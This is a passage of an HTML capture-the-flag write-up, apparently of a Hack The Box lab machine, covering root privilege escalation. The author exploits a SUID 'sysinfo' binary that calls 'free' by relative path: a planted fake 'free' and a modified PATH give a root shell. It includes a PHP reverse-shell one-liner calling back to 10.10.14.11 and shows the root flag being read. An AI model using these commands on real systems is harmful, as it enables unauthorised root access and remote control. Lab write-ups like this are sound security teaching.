+</code></pre>
+<p>Locating free</p>
+<pre><code>theseus@ubuntu:/tmp$ locate free | grep bin 
+locate free | grep bin
+/sbin/fsfreeze
+/snap/core/7917/sbin/fsfreeze
+/snap/core/7917/usr/bin/free
+/snap/core/7917/usr/sbin/e2freefrag
+/snap/core/8689/sbin/fsfreeze
+/snap/core/8689/usr/bin/free
+/snap/core/8689/usr/sbin/e2freefrag
+/snap/core18/1223/sbin/fsfreeze
+/snap/core18/1223/usr/bin/free
+/snap/core18/1223/usr/sbin/e2freefrag
+/snap/core18/1668/sbin/fsfreeze
+/snap/core18/1668/usr/bin/free
+/snap/core18/1668/usr/sbin/e2freefrag
+/usr/bin/free
+/usr/sbin/e2freefrag
+</code></pre>
+<p>Checking inside with <em>ltrace</em> I discovered it is not using the full path of the binary and is looking inside the user path var.</p>
+<p>So it is vulnerable to alter the user path var.</p>
+<h3 id="custom-binary-and-root">Custom binary and root</h3>
+<p>I crafted a special &ldquo;free&rdquo; binary to make a reverse shell and I modifed the theseus var path to use the path <em>/tmp/bin</em> to force <em>sysinfo</em> to use my custom <em>free</em>:</p>
+<pre><code>echo “php -r '$sock=fsockopen(&quot;10.10.14.11&quot;,1338);exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);'” &gt; free
+
+theseus@ubuntu:/tmp/bin$ chmod +s free
+
+theseus@ubuntu:/tmp/bin$ chmod +x free
+</code></pre>
+<p>But did not work as expected, the reverse shell is not opened but executed the /bin/sh as root&hellip; and I got a working shell with root!</p>
+<pre><code>theseus@ubuntu:/tmp/bin$ sysinfo
+====================Hardware Info====================
+H/W path           Device      Class      Description
+=====================================================
+                           system     VMware Virtual Platform
+/0                             bus        440BX Desktop Reference Platform
+/0/0                           memory     86KiB BIOS
+/0/1                           processor  AMD EPYC 7401P 24-Core Processor
+/0/1/0                         memory     16KiB L1 cache
+/0/1/1                         memory     16KiB L1 cache
+
+
+[..]
+
+TLB size        : 2560 4K pages
+clflush size    : 64
+cache_alignment : 64
+address sizes   : 43 bits physical, 48 bits virtual
+power management:
+
+
+====================MEM Usage=====================
+# ls
+ls
+# whoami
+root
+# cat /root/root.txt
+8bb[...]2b75
+</code></pre>
+<p>So my first approach of using a reverse shell with PHP, can be simplified to only open a shell as root.</p>
+<p>Thanks for reading!</p>
+</div>
+
+  </article>
+</main>
+<footer>
+  <div>
+    <nav class="footer-menu"><a href="https://github.com/u915">GitHub</a><a href="https://www.linkedin.com/in/daniel-canomerchan">Linkedin</a><a href="/posts/index.xml">RSS</a><a href="/sitemap.xml">Sitemap</a></nav>
+    <div>© 2020 — u915 — <a href="/license/">License</a></div>
+  </div>
+</footer>
+</body>
+</html>
